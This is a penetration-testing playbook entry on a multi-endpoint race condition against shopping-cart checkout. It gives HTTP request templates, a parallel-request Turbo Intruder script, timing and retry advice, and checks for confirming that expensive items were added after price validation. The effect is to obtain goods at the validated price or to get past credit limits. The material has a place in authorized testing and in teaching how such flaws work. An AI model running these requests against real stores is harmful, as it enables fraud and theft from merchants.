# Multi-Endpoint Race (Cart / Checkout / State Inconsistency)

## When this applies

- Two endpoints share state (e.g., cart contents) and are processed asynchronously.
- One endpoint validates state; the other modifies it. Sending both in parallel causes the validator to read stale state.
- Common in shopping carts: validation reads cart at start of checkout, but cart contents change mid-validation.

## Technique

Fire the validator request and a state-mutator request in parallel (single-packet attack). Validator finishes against pre-mutation state; mutation lands; the eventual confirmation reflects the new (post-mutation) cart but at the validated price.

**Vulnerable Code:**
```python
cart = get_cart(session)
if validate_payment(cart.total):
    confirm_order(cart)
```

**Attack Pattern:**
```
Parallel:
  - POST /checkout
  - POST /cart/add (expensive item)
```

**Success Signature:** Order contains items not in validation, purchase exceeds credit limit.

## Steps

### Request templates

```http
# Request 1: Checkout with cheap item
POST /cart/checkout HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN

csrf=TOKEN

# Request 2: Add expensive item during validation
POST /cart HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN

productId=EXPENSIVE_ITEM&quantity=1
```

### Timing

```
Connection warming: GET / (5 times)
Then: Send both requests in parallel
Retry: 10-20 times for success
```

### Multi-Request Race (Turbo Intruder)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    request1 = '''POST /endpoint1 HTTP/2
Host: target.com

data1
'''

    request2 = '''POST /endpoint2 HTTP/2
Host: target.com

data2
'''

    # Queue both with same gate
    engine.queue(request1, gate='race1')
    engine.queue(request2, gate='race1')

    engine.openGate('race1')
```

## Verifying success

- Order/checkout completes at the validated price but the order ITEMS list contains the late-added expensive item.
- Credit limit / balance is bypassed by the sum of all items added through races.
- Database shows order line items that exceed the validated total.

## Common pitfalls

- Some apps re-validate cart at the final commit step — the race window is narrower; need higher request volume.
- Different endpoints may use different sessions / DB connections — ensure same session cookie on both.
- Connection warming (5 GETs to `/`) reduces jitter and increases success rate.

## Tools

- Burp Turbo Intruder (multi-request gates)
- h2spacex
- Burp Repeater (tab groups containing the 2 requests)
